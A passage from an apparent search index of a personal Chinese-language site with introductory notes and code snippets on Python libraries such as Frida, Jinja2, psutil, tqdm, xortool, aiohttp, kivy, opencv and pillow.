等，\n使得开发者可以根据自己的喜好和需求选择合适的编程语言进行应用程序的动态分析和修改。 注解 比如侵入到微信进程中提取表情包: https://github.com/K265/frida-wechat-sticker/tree/main FRIDA一般在系统层面的调用都是JS代码.\nfrida的注入脚本是JavaScript， 因此我们后面都是通过js脚本来操作设备上的Java代码的。 其他点: 由于js代码注入时可能会出现超时的错误， 为了防止这个问题，\n我们通常还需要在最外面包装一层 setImmediate(function(){}) 的代码。 frida-工具 共有6个： frida CLI: 是一个交互式解释器（REPL），他的交互形式跟IPython很类似。 frida-ps: 用于列出进程的一个命令行工具，当我们需要跟远程系统进行交互的时候，这个是非常有用的。 frida-trace frida-discover frida-ls-devices frida-kill 常用输出 console-普通打印 与普通JS输出一致: console.log('xxx')\nconsole.warn('xxx')\nconsole.error('xxx') hexdump-打印内存地址信息 target参数可以是ArrayBuffer或者NativePointer,\n而options参数则是自定义输出格式可以填这几个参数offset、lengt、header、ansi。 示例: var libc = Module.findBaseAddress('libc.so');\nconsole.log(hexdump(libc, {\n  offset: 0,\n  length: 64,\n  header: true,\n  ansi: true\n})); send回调-Python send是在python层定义的on_message回调函数，\njscode内所有的信息都被监控script.on('message', on_message)，\n当输出信息的时候on_message函数会拿到其数据再通过format转换，\n其最重要的功能也是最核心的是能够直接将数据以json格式输出，\n当然数据是二进制的时候也依然是可以使用send: # -*- coding: utf-8 -*-\nimport frida\nimport sys\n\ndef on_message(message, data):\n    if message['type'] == 'send':\n        print(\"[*] {0}\".format(message['payload']))\n    else:\n        print(message)\n\njscode = \"\"\"\n    Java.perform(function ()\n    {\n        var jni_env = Java.vm.getEnv();\n        console.log(jni_env);\n        send(jni_env);\n    });\n\"\"\"\n\nprocess = frida.get_usb_device().attach('com.roysue.roysueapplication')\nscript = process.create_script(jscode)\nscript.on('message', on_message)\nscript.load()\nsys.stdin.read() 运行脚本效果如下: roysue@ubuntu:~/Desktop/Chap09$ python Chap03.py\n[object Object]\n[*] {'handle': '0xdf4f8000', 'vm': {}} 可以看出这里两种方式输出的不同的效果，console直接输出了[object Object]，无法输出其正常的内容，因为jni_env实际上是一个对象，但是使用send的时候会自动将对象转json格式输出 参考: FRIDA-API使用篇：rpc、Process、Module、Memory使用方法及示例 详解Hook框架frida，让你在逆向工作中效率成倍提升 看起来最推荐: https://juejin.cn/post/7308240524964134924 待看 hook工具frida原理及使用, Java程序使用","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Frida.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Frida.html"},{"title":"Jinja2","text":"一个仿照 Django 的模版引擎, 安装: pip install Jinja2 加载模版: >>> from jinja2 import Template as T\n>>> t = T('ti is a test msg, say {{ msg }}')\n>>> t.render(msg='you say say you')\n'ti is a test msg, say you say say you'\n>>> 部分语法: 代码块: {% 代码块 %} 变量: {{ 变量 }} 注释: {# 注释 #} 行语句, 行内语句为 Python 代码: # 行语句 过滤器, 使用管道符号, 支持链式: {{ 变量 | 函数1 | 函数2 }} 一些预定义函数 字符串操作: safe, 禁用转义 capitalize, 把变量值的首字母转成大写，其余字母转小写 lower, 把值转成小写 upper, 把值转成大写 title, 把值中的每个单词的首字母都转成大写 reverse, 字符串反转 format, 格式化输出 striptags, 渲染之前把值中所有的HTML标签都删掉 truncate: 字符串截断 列表操作: first, 取第一个元素 last, 取最后一个元素 length, 获取列表长度 sum, 列表求和 sort, 列表排序 常用逻辑: 判断: {% if 条件 %}\n  此处可以是html 代码\n{% endif %} 注意等价于: # if 条件\n  此处可以是html 代码\n# endif 循环: {% for x in 列表 %}\n  此处可以是html 代码\n{% endfor %}","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Jinja2.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Jinja2.html"},{"title":"m3u8","text":"pypi官网地址: https://pypi.org/project/m3u8/ 安装: pip install m3u8 媒体文件转换为m3u8格式.\n一般与 ffmpeg 一起使用. 加载m3u8文件, 参数为本地位置或网络url: m3u8.load(file_or_url)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-M3U8.html","loc":"/yq-docs-rear-end-python-python-three--party-library-M3U8.html"},{"title":"psutil","text":"便捷的系统监控工具. 安装: pip install psutil 获取cpu信息 获取cpu信息: psutil.cpu_times() 获取内存信息 使用psutil获取物理内存和交换内存信息，分别使用: psutil.virtual_memory()\npsutil.swap_memory() 获取磁盘信息 可以通过psutil获取磁盘分区、磁盘使用率和磁盘IO信息: psutil.disk_partitions() # 磁盘分区信息\npsutil.disk_usage('/') # 磁盘使用情况\npsutil.disk_io_counters() # 磁盘IO 获取网络信息 psutil可以获取网络接口和网络连接信息: psutil.net_io_counters() # 获取网络读写字节／包的个数\npsutil.net_if_addrs() # 获取网络接口信息\npsutil.net_if_stats() # 获取网络接口状态 要获取当前网络连接信息，使用net_connections(): psutil.net_connections() 若权限不足需要获取权限, 如 sudo 启动 (因为会调用系统的接口) 获取进程信息 通过psutil可以获取到所有进程的详细信息: >>> psutil.pids() # 所有进程ID\n[3865, 3864, 3863, 3856, 3855, 3853, 3776, ..., 45, 44, 1, 0]\n>>> p = psutil.Process(3776) # 获取指定进程ID=3776，其实就是当前Python交互环境\n>>> p.name() # 进程名称\n'python3.6'\n>>> p.exe() # 进程exe路径\n'/Users/michael/anaconda3/bin/python3.6'\n>>> p.cwd() # 进程工作目录\n'/Users/michael'\n>>> p.cmdline() # 进程启动的命令行\n['python3']\n>>> p.ppid() # 父进程ID\n3765\n>>> p.parent() # 父进程\n<psutil.Process(pid=3765, name='bash') at 4503144040>\n>>> p.children() # 子进程列表\n[]\n>>> p.status() # 进程状态\n'running'\n>>> p.username() # 进程用户名\n'michael'\n>>> p.create_time() # 进程创建时间\n1511052731.120333\n>>> p.terminal() # 进程终端\n'/dev/ttys002'\n>>> p.cpu_times() # 进程使用的CPU时间\npcputimes(user=0.081150144, system=0.053269812, children_user=0.0, children_system=0.0)\n>>> p.memory_info() # 进程使用的内存\npmem(rss=8310784, vms=2481725440, pfaults=3207, pageins=18)\n>>> p.open_files() # 进程打开的文件\n[]\n>>> p.connections() # 进程相关网络连接\n[]\n>>> p.num_threads() # 进程的线程数量\n1\n>>> p.threads() # 所有线程信息\n[pthread(id=1, user_time=0.090318, system_time=0.062736)]\n>>> p.environ() # 进程环境变量\n{'SHELL': '/bin/bash', 'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:...', 'PWD': '/Users/michael', 'LANG': 'zh_CN.UTF-8', ...}\n>>> p.terminate() # 结束进程\nTerminated: 15 <-- 自己把自己结束了 和获取网络连接类似，获取一个root用户的进程需要root权限，启动Python交互环境或者.py文件时，需要sudo权限。 psutil还提供了一个test()函数，可以模拟出ps命令的效果: >>> import psutil\n>>> psutil.test()\nUSER         PID %MEM     VSZ     RSS TTY           START    TIME  COMMAND\nroot           0 24.0 74270628 2016380 ?             Nov18   40:51  kernel_task\nroot           1  0.1 2494140    9484 ?             Nov18   01:39  launchd\nroot          44  0.4 2519872   36404 ?             Nov18   02:02  UserEventAgent\nroot          45    ? 2474032    1516 ?             Nov18   00:14  syslogd\nroot          47  0.1 2504768    8912 ?             Nov18   00:03  kextd\nroot          48  0.1 2505544    4720 ?             Nov18   00:19  fseventsd\n_appleeven    52  0.1 2499748    5024 ?             Nov18   00:00  appleeventsd\nroot          53  0.1 2500592    6132 ?             Nov18   00:02  configd\n... 使用技巧 例如用来回收自己残留的子进程: _pid = os.getpid()\n\npro = psutil.Process(_pid)\npro.terminate()","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-PSUTIL.html","loc":"/yq-docs-rear-end-python-python-three--party-library-PSUTIL.html"},{"title":"pathos","text":"github地址:: pathos-github 官方文档:: pathos-doc 官网下载文档(pdf):: pythos-pdf <../../../../resources/pdf/1202.1056.pdf> github开头就说提供一个并行的图形化管理... 没看懂... 下有用模块: dill: serialize all of Python pox: utilities for filesystem exploration and automated builds klepto: persistent caching to memory, disk, or database multiprocess: better multiprocessing and multithreading in Python ppft: distributed and parallel Python pyina: MPI parallel map and cluster scheduling pathos: graph management and execution in heterogeneous computing 有用的方法/类 pathos.abstract_launcher [worker pool API 定义] pathos.pools [所有 pathos worker pools] pathos.core [高级命令接口] pathos.hosts [hostname 注册接口] pathos.serial.SerialPool [python 串行 worker pool] pathos.parallel.ParallelPool [python 并行 worker pool] pathos.multiprocessing.ProcessPool [the multiprocessing worker pool] pathos.threading.ThreadPool [the multithreading worker pool] pathos.connection.Pipe [the launcher base class] pathos.secure.Pipe [the secure launcher base class] pathos.secure.Copier [the secure copier base class] pathos.secure.Tunnel [the secure tunnel base class] pathos.selector.Selector [the selector base class] pathos.server.Server [the server base class] pathos.profile [profiling in threads and processes] pathos.maps [standalone map instances] 同时提供了两个命令, 支持便捷建立安全连接, 脚本已安装到环境变量下, 所以直接命令调用即可. portpicker [get the portnumber of an open port] pathos_connect [establish tunnel and/or RPC server] 使用 --help 获取帮助信息.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Pathos.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Pathos.html"},{"title":"progress","text":"安装: pip install progress 关于进度条可参见: ProgressInPy 主要是用来 progress.bar 做进度条控制的: from progress.bar import Bar\n\ndef print_hi():\n    n = 10000\n    with Bar('进度', max=n) as bar:\n        for i in range(n):\n            for j in range(n):\n                j += i\n            bar.next() 效果","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Progress.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Progress.html"},{"title":"tqdm","text":"也是用来做进度控制的 关于进度条可参见: ProgressInPy 安装: pip install pqdm 例子: from tqdm import tqdm, trange\n\ndef print_hi():\n    n = 10000\n    # 也可以\n    # for i in trange(n):\n    for i in tqdm(range(n)):\n        for j in range(n):\n            j += i 效果: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 10000/10000 [00:02<00:00, 4132.14it/s] 还可以跟 rich 一起弄彩色进度条 也可以与 notebook, tk等一起: # 彩色进度\nfrom tqdm.rich import tqdm, trange\n# 兼容 jupyter\nfrom tqdm.notebook import tqdm, trange\n# tk进度条\nfrom tqdm.tk import tqdm, trange 如果是非循环代码的进度条, 直接定义tqdm对象即可: bar = tqdm(total=100)\n...\nbar.update(10)\n...\nbar.update(30)\n...\n...","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-TQDM.html","loc":"/yq-docs-rear-end-python-python-three--party-library-TQDM.html"},{"title":"xortool","text":"安装: pip install xortool xortool 是一个用于分析和破解 XOR 密码的 Python 工具。\nXOR（异或）是一种简单的加密算法，它将明文与一个密钥进行按位异或运算，从而产生密文。\nxortool 旨在自动化分析 XOR 密文并尝试找到密钥，以便解密数据。 使用 xortool，你可以通过以下方式进行 XOR 密码分析： 密文频率分析：xortool 可以分析密文的频率分布，并根据字符出现的频率猜测密钥的长度。 密钥长度猜测：xortool 提供了几种自动猜测密钥长度的方法，\n包括指数重复密钥长度检测（Index of Coincidence）和最长重复字串长度检测（Longest Repeated Substring）。 密钥搜索：xortool 将使用不同的方法来搜索可能的密钥，包括暴力破解和基于密文频率的猜测。 解密结果输出：一旦找到可能的密钥，xortool 可以将解密结果输出到文件或终端。 xortool 是一个强大的工具，尤其适用于简单的 XOR 加密和小密钥长度。\n然而，对于更复杂的加密算法和长密钥长度，xortool 的效果可能会受到限制。 这是一个命令行工具: xortool file.bin","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Xortool.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Xortool.html"},{"title":"aiohttp","text":"官网:: Welcome to AIOHTTP 异步的网络连接库 , 内部存在 asyncio 库的调用, 如 run_in_executor 安装: pip install aiohttp 默认的编码库 charset-normalizer 较慢, 可使用 cchardet 替代: $ pip install cchardet 算了, 现在 cchardet 已经没维护了, 不支持大于 3.10 的版本. 建议安装 aiodns 库, 更快的 dns 解析: pip install aiodns aiohttp.web.Application 创建web服务器所用类 增加路径映射: app = Application()\napp.router.add_static() 除了 add_static, 还有 add_get 等 或者使用直接给整个路径的列表: app.add_routes([\n  web.get('/', handle),\n  web.get('/{name}', handle)\n]) server处理 一个server处理示例: from aiohttp import web\n\nasync def handle(request):\n    name = request.match_info.get('name', \"Anonymous\")\n    text = \"Hello, \" + name\n    return web.Response(text=text)\n\napp = web.Application()\napp.add_routes([web.get('/', handle),\n                web.get('/{name}', handle)]) 在aiohttp的web应用中,handler函数接受的request是aiohttp.web.Request对象。 aiohttp.web.Request对象包含了客户端发来的HTTP请求的所有详情,我们可以从中获取:\n- 请求方法(method)\n- 请求URL(url)\n- 请求头(headers)\n- 请求体(body)\n- Query参数(query)\n- 等等 可以这样处理: async def handle_rpc(request: aiohttp.web.Request):\n  method = request.method\n  url = request.url\n  headers = request.headers\n  query = request.query  # 获取query参数\n\n  # 获取请求体\n  data = await request.text()  # 获取字符串\n  data = await request.read()  # 获取byte流\n  data = await request.json()  # 获取JSON\n\n  # 构造响应\n  response = aiohttp.web.Response(text='result')\n  return response 举例 客户端代码举例: import aiohttp\nimport asyncio\n\nasync def main():\n\n    async with aiohttp.ClientSession() as session:\n        async with session.get('http://python.org') as response:\n\n            print(\"Status:\", response.status)\n            print(\"Content-type:\", response.headers['content-type'])\n\n            html = await response.text()\n            print(\"Body:\", html[:15], \"...\")\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(main()) server 代码举例: from aiohttp import web\n\nasync def handle(request):\n    name = request.match_info.get('name', \"Anonymous\")\n    text = \"Hello, \" + name\n    return web.Response(text=text)\n\napp = web.Application()\napp.add_routes([web.get('/', handle),\n                web.get('/{name}', handle)])\n\nif __name__ == '__main__':\n    web.run_app(app) 使用 get 请求举例: async def main_aiohttp():\n\n  async with aiohttp.request(method='get', url='https://docs.aiohttp.org/en/stable/') as r:\n      print(r)\n\nif __name__ == '__main__':\n    import aiohttp\n    asyncio.run(main_aiohttp()) 一些说明 最近开发的时候遇到网络库的问题, 背景如下: 公司自己有基于 C 的 GUI 库, 这个库被编译为了 Python 框架, 然后重写了 asyncio 的事件循环(为了结合这个框架的事件循环) 发现在使用 loop.run_in_executor 时, 且传入的函数为 requests 的调用时: def try_connect(address: str):\n  try:\n    with requests.get(address):\n      return True\n  expect:\n    return False 且在 虚拟机/云桌面 运行时, 会存在异常, 此处的 expect 可以说是无效, 看着是这个异常导致后面哪有问题.\n也看不了堆栈信息. debug 又不会出现这个问题. 总结下来就是, 丢到线程池执行器内部执行, 且 requests.get 存在异常时, 且平台为虚拟机时, 一定会触发.\n后面有空看看官方自己的事件循环有没有这个问题. 最后换了 aiohttp 就解决了. 还不确定是 requests 库本身的问题, 还是公司框架内部的事件循环有问题","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-aiohttp.html","loc":"/yq-docs-rear-end-python-python-three--party-library-aiohttp.html"},{"title":"alive-progress","text":"关于进度条可参见: ProgressInPy 安装: pip install alive-progress 与 progress 类似,\n不过更花哨: from alive_progress.styles import showtime\n\ndef print_hi():\n    showtime()","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-alive-progress.html","loc":"/yq-docs-rear-end-python-python-three--party-library-alive-progress.html"},{"title":"cerberus","text":"前言 cerberus 是一个用于数据表单校验的三方包 支持选项 cerberus支持规则 选项 type 类型, 如string, int, datetime required 是否必填, True/False minlength 数据最小长度 maxlength 数据最大长度 regex 数据使用正则规则校验, 如 '&#94;0[0-9]{9}$' coerce 数据转换, 如转换日期为某个需要的, 值为函数 allowed 列表, 只能为列表内有的值 allof 列表, 多个条件的列表, 其中的条件都需要满足 anyof 列表, 满足任一条件即可 noneof 列表, 多个条件的列表, 其中的条件都不需要满足 oneof 满足此约束 check_with 函数, 使用函数检查, 注意参数列表为: field, value, error contains 列表或者字符串, 实际数据集需包含所有枚举 dependencies 值为另一个数据列, 当前列有值时, 另一个数据列必须有值 empty True/False, 是否允许为空 excludes 字符串列表或者字符串, 实际值必不包含其中 forbidden 字符串列表或者字符串, 禁止填写的值, 与上一个类似 items 列表, 实际填写的值需与此处对应, 有顺序之分 keysrules 字典, 可填写其他规则, 规范定义数据字典的键 meta 一个描述, 不用与规则 min 数据最小值 max 数据最大值 nullable True/False, 是否可为None readonly True, 数据字段是否只读 require_all 所有属性都必填 技巧 参考: Validation Rules 如定义一个字典验证器: schema = {\n    'name': {'type': 'string', 'required': True},\n    'age': {'type': 'integer', 'min': 18, 'max': 99},\n    'email': {'type': 'string', 'regex': r'&#94;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'}\n} 示例","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-cerberus.html","loc":"/yq-docs-rear-end-python-python-three--party-library-cerberus.html"},{"title":"clint","text":"进度条功能实现模块","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-clint.html","loc":"/yq-docs-rear-end-python-python-three--party-library-clint.html"},{"title":"ffmpeg-python","text":"安装: pip install ffmpeg-python 媒体文件处理","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-ffmpeg.html","loc":"/yq-docs-rear-end-python-python-three--party-library-ffmpeg.html"},{"title":"jsonrpc","text":"注解 这玩意儿不止一个, 看了一下, 有 jsonrpc, json-rpc, python-jsonrpc ... 都觉得别人的轮子不好用要自己造是吧, 没有技巧, 全是毒, 这一篇没啥具体要写的 基于json的跨语言远程调用协议. 调用的json格式: {\n        \"method\": \"方法名\",\n        \"params\": [\"参数数组\"],\n        \"id\":  方法ID\n} 返回的json格式: {\n\n        \"jsonrpc\": \"2.0\",\n        \"id\": \"1234\",\n        \"result\": null\n}","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-jsonRPC.html","loc":"/yq-docs-rear-end-python-python-three--party-library-jsonRPC.html"},{"title":"安装kivy","text":"官网安装介绍: https://kivy.org/doc/stable/gettingstarted/installation.html 一般都是用的桌面系统开发, 所以直接使用 pip安装即可: pip install \"kivy[full]\" kivy_examples 可惜我用我的老Mac安装失败了, base Python3.11: ...\n\n      Updated /private/var/folders/4x/bpwwvvpn6d38ckdfw01fdggc0000gn/T/pip-install-nkzgam0u/kivy_f50690eb2e4f4577bf77f4119d23842a/kivy/include/config.pxi\n      Updated build/lib.macosx-13-x86_64-cpython-311/kivy/setupconfig.py\n      Updated /private/var/folders/4x/bpwwvvpn6d38ckdfw01fdggc0000gn/T/pip-install-nkzgam0u/kivy_f50690eb2e4f4577bf77f4119d23842a/kivy/setupconfig.py\n      Detected compiler is unix\n      error: command '/usr/bin/clang' failed with exit code 1\n      [end of output]\n\n  note: This error originates from a subprocess, and is likely not a problem with pip.\n  ERROR: Failed building wheel for kivy\nFailed to build kivy\nERROR: Could not build wheels for kivy, which is required to install pyproject.toml-based projects 查询说需要安装python-dev, 但是Mac又没有这玩意儿,\n然后去github Kivy won't install on Python 3.11.0 上看了一下, 直接安装master的解决: pip install \"kivy[full] @ https://github.com/kivy/kivy/archive/master.zip\"","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-kivy-Install-Kivy.html","loc":"/yq-docs-rear-end-python-python-three--party-library-kivy-Install-Kivy.html"},{"title":"使用-kv语言","text":"官网文档: https://kivy.org/doc/stable/gettingstarted/rules.html kivy设计的类似于Python的语言, 将逻辑与构建分离, 初步感觉能减少部分工作量.\n后缀为kv, 文件名为应用程序入口类名App前面的字符串的小写.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-kivy-Use--kv-language.html","loc":"/yq-docs-rear-end-python-python-three--party-library-kivy-Use--kv-language.html"},{"title":"使用-属性声明","text":"官网: https://kivy.org/doc/stable/gettingstarted/properties.html kivy提供了属性构造的方法, 比如一个数字: numeric_var = NumericProperty(1) 主要用于与kv文件的属性交互, 有以下优点 支持值的自动变更 校验值是否符合要求 优化内存管理 警告 需要在类级别声明, 即声明为类变量. 支持定义 on_<propertyname> 实例方法来获取值变更事件. 提供的属性: NumericProperty 数字 StringProperty 字符串 ListProperty 列表 ObjectProperty Python类实例 BooleanProperty bool BoundedNumericProperty 区间值,\n如: number = BoundedNumericProperty(0, min=-5, max=5) 表示默认值为0, 最小为-5, 最大为5 OptionProperty ReferenceListProperty AliasProperty DictProperty 字典 VariableListProperty ConfigParserProperty ColorProperty 颜色,\n支持的参数类型: 三或四个float在0到1之间的值, 默认为1 (1.0, 1.0, 1.0, 1.0) 字符串类型的颜色进制, 如 #rrggbb or #rrggbbaa 字符串类型颜色名, 如 red, yellow","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-kivy-Use-attribute-declaration.html","loc":"/yq-docs-rear-end-python-python-three--party-library-kivy-Use-attribute-declaration.html"},{"title":"line_profiler","text":"性能调优模块, 有个类似的 memory_profiler 官网: https://pypi.org/project/line-profiler/ 安装: pip install line_profiler 方法1 使用 @profile 装饰器后: kernprof -lv script_to_profile.py 貌似也直接可以用代码: from line_profiler import LineProfiler\n\ndef base_func3():\n    for n in range(10000):\n        print(f'当前n的值是：{n}')\n\n\nlp = LineProfiler()\nlp_wrap = lp(base_func3)\nlp_wrap()\nlp.print_stats()","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-line_profiler.html","loc":"/yq-docs-rear-end-python-python-three--party-library-line_profiler.html"},{"title":"maturin","text":"将 Rust 代码编译为Python包 安装: pip install maturin Python包生成 先进入 项目根目录 , 然后执行: maturin init 会生成 Cargo.toml 和 lib.rs 然后: maturin develop 如果之前没配置过Rust， 参考 index","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-maturin.html","loc":"/yq-docs-rear-end-python-python-three--party-library-maturin.html"},{"title":"memory_profiler","text":"性能调优模块, 有个类似的 line_profiler 官网: https://pypi.org/project/memory-profiler/ 安装: pip install memory_profiler 最简单的使用就是使用装饰器: from memory_profiler import profile\n\n@profile\ndef count():\n  a += 1\n  ... 输出头的含义: Line #    Mem usage    Increment  Occurrences   Line Contents 分别为: 代码所在行; 内存总共占用, 增加的内存; 运行次数; 代码内容 找内存泄漏，直接看Increment; 如果想找内存瓶颈，就看Mem usage mprof指令 安装此模块时候, 一般会同时安装以下mprof指令,\n可以用来绘制内存变化图 先执行(app,py内先要有@profile装饰器, 如上): mprof run app.py 然后会生成一个 mprofile_xxxxxxxxxxxx.dat 文件,\n通过此文件画出内存变化图: mprof plot mprofile_xxxxxxxxxxxxxxxx.dat","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-memory_profiler.html","loc":"/yq-docs-rear-end-python-python-three--party-library-memory_profiler.html"},{"title":"numpy","text":"官网: https://numpy.org","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-numpy.html","loc":"/yq-docs-rear-end-python-python-three--party-library-numpy.html"},{"title":"opencv","text":"安装: pip install opencv-python 印象里多用于深度学习下的图像处理, 一般与 numpy 一起使用 导入: import cv2 opencv 获取的图像都是 numpy 的 ndarray 对象 对于一个长宽分别为w、h的RGB彩色图像来说，它的每个像素值是由(B、G、R)的一个tuple组成，\nopencv-python中每个像素三个值的顺序是(B、G、R) 读取图像-imread cv2.imread(path_of_image, intflag) 读取图像 path_of_image: 图像路径 intflag: 读取形式, 支持以下参数: cv2.IMREAD_COLOR: 1, 加载彩色图像。任何图像的透明度都将被忽略。它是默认标志 cv2.IMREAD_GRAYSCALE: 0, 以灰度模式加载图像 cv2.IMREAD_UNCHANGED: -1, 保留读取图片原有的颜色通道 显示图像-imshow cv2.imshow(windows_name, image) 窗口显示图像 windows_name: str 窗口名称 image: 图片对象, 即上面 读取图像-imread 读取的对象. 类型为numpy中的ndarray 支持使用 imutils.resize(image, size) 来调整大小 例: img = cv2.imread('img.png')\ncv2.imshow('image', imutils.resize(img, 800))\nif cv2.waitKey(0) == 27:\n    cv2.destroyAllWindows() 保存图像-imwrite cv2.imwrite(image_filename, image) 将图片对象写入文件(保存) image_filename: str 保存的图像名称 image: 图像对象，即上面 读取图像-imread 读取的对象. 类型是numpy中的ndarray类型 例: cv2.imwrite('img_1.jpg', img)   # 将图像保存成jpg文件\ncv2.imwrite('img_2.png', img)   # 将图像保存成png文件 放置文字-putText 只能英文, 中文会乱码, 据说 opencv5.0 会解决这个问题, 截止目前尚未发布. 转换为PIL可添加中文: https://cloud.tencent.com/developer/article /2214890# 窗口销毁-destroyAllWindows/destroyWindow cv2.destroyWindow(windows_name) 销毁单个特定窗口 windows_name: str 销毁窗口名, 由上面 显示图像-imshow 的第一个参数指定 cv2.destroyAllWindows() 销毁全部窗口，无参数 cv2.waitKey(time_of_milliseconds) 与上两个函数一起使用, 等待一段时间销毁窗口 time_of_milliseconds: int 大于0时, 表示等待多少毫秒销毁 小于等于0时, 表示等待键盘敲击事件, 满足时销毁.\n如, 指定waitKey(0) == 27时当敲击键盘 Esc 时便销毁所有窗口: if cv2.waitKey(0) == 27: cv2.destroyAllWindows() 当接收到键盘敲击A时，便销毁名称为'origin image'的图像窗口: if cv2.waitKey(-1) == ord('A'): cv2.destroyWindow('origin image') 图像色彩空间变换-cvtColor cv2.cvtColor(input_image, flag) 图像色彩空间变换函数 input_image: 将要变换色彩的图像ndarray对象, 即上面 读取图像-imread 读取的对象 flag: 图像色彩空间变换的类型，常用的两种: cv2.COLOR_BGR2GRAY: 表示将图像从BGR空间转化成灰度图，最常用 cv2.COLOR_BGR2HSV: 表示将图像从RGB空间转换到HSV空间 获取全部274种空间转换类型: import cv2\nflags = [i for i in dir(cv2) if i.startswith('COLOR_')]\nprint(flags) 图像处理时, 经常将彩色图像转化成灰度图像, 因为图像颜色会因为光照因素而产生不同变化(即变成不同颜色图片).\n而图像特征提取/识别过程，需要的是图像的梯度信息，也就是图像的本质内容，所以去除颜色对梯度干扰. 可以降低数据量, 增强处理效果. 图像绘制 直线 cv2.line: 直线-line 长方形 cv2.rectangle: 长方形-rectangle 圆 cv2.circle: 圆-circle 椭圆 cv2.ellipse: 椭圆-ellipse 多边形 cv2.polylines: 多边形-polylines 公共参数： img: 表示需要进行绘制的图像对象ndarray color: 表示绘制几何图形的颜色，采用BGR即上述说的(B、G、R) thickness: 表示绘制几何图形中线的粗细，默认为1，对于圆、椭圆等封闭图像取-1时是填充图形内部 lineType: 表示绘制几何图形线的类型，默认8-connected线是光滑的，当取cv2.LINE_AA时线呈现锯齿状 直线-line cv2.line(image, starting, ending, color, thickness, lineType) starting: 线的起点像素坐标 ending: 线的终点像素坐标 长方形-rectangle cv2.rectangle(image, top-left, bottom-right, color, thickness, lineType) top-left: 表示长方形的左上角像素坐标 bottom-right: 表示长方形的右下角像素坐标 圆-circle cv2.circle(image, center, radius, color, thickness, lineType) center: 表示圆的圆心像素坐标 radius: 表示圆的半径长度 圆绘制函数中当参数thickness = -1 时绘制的是实心圆，当thickness >= 0 时绘制的是空心圆 椭圆-ellipse cv2.circle(image, center, (major-axis-length, minor-axis-length), angle, startAngle, endAngle, color, thickness, lineType) center: 表示椭圆中心像素坐标 major-axis-length: 表示椭圆的长轴长度 minor-axis-length: 表示椭圆的短轴长度 angle: 表示椭圆在逆时针方向旋转的角度 startAngle: 表示椭圆从主轴向顺时针方向测量的椭圆弧的起始角度 endAngle: 表示椭圆从主轴向顺时针方向测量的椭圆弧的终止时角度 当参数thickness = -1 时绘制的是实心椭圆，当thickness >= 0 时绘制的是空心椭圆 多边形-polylines cv2.polylines(image, [point-set], flag, color, thickness, lineType) point-set: 表示多边形点的集合，如果多边形有m个点，则便是一个m*1*2的数组，表示共m个点 flag: bool 当flag = True 时，则多边形是封闭的，当flag = False 时，则多边形只是从第一个到最后一个点连线组成的图像，没有封闭 例: pts = np.array([[10,5],[20,30],[70,20],[50,10]], np.int32)\nimg = cv2.polylines(img,[pts],True,(0, 0, 0), 2) 对图像的简单像素操作 对图像取反: gray_img = cv2.imread('img.jpg', 0)  # 加载灰度图像\nreverse_img = 255 - gray_img 对图像像素线性变换: for i in range(gray_img.shape[0]):\n  for j in range(gray_img.shape[1]):\n    random_img[i, j] = gray_img[i, j]*1.2","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-opencv-python.html","loc":"/yq-docs-rear-end-python-python-three--party-library-opencv-python.html"},{"title":"outcome","text":"捕获函数运行的结果","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-outcom.html","loc":"/yq-docs-rear-end-python-python-three--party-library-outcom.html"},{"title":"pillow(PIL)","text":"安装: pip install pillow 导入: imprt PIL PIL，全称 Python Imaging Library, 图像处理库. PIL 仅支持到Python 2.7，加上年久失修，于是一群志愿者在 PIL 的基础上创建了兼容 Python 3 的版本，名字叫 Pillow ，\n可以通过安装 Pillow 来使用 PIL。 打开、保存、显示图片 打开、保存、显示图片: from PIL import Image\n\nimage = Image.open('img.jpg')\nimage.show()\nimage.save('1.jpg')\nprint(image.mode, image.size, image.format)\n# RGB (481, 321) JPEG mode 为图片的模式，RGB 代表彩色图像，L 代表光照图像也即灰度图像等 size 为图片的大小(宽度，长度) format 为图片的格式，如常见的 PNG、JPEG 等 转换图片模式 转换图片模式: image.show()\ngrey_image = image.convert('L')\ngrey_image.show() 通道分离合并 通道分离合并: r, g, b = image.split()\nim = Image.merge('RGB', (b, g, r)) 彩色图像可以分离出 R、G、B 通道，但若是灰度图像，则返回灰度图像本身。然后，可以将 R、G、B 通道按照一定的顺序再合并成彩色图像。 图片裁剪、旋转和改变大小 图片裁剪、旋转和改变大小: # 对角坐标, 左上(x, y), 右下(x, y)\nbox = (100, 100, 300, 300)\nregion = image.crop(box)\n# 翻转180度\nregion = region.transpose(Image.ROTATE_180)\nimage.paste(region, box)\nimage.show() 或者: im = image.resize((300, 300))\nim = image.rotate(45)  # 逆时针旋转 45 度\nim = 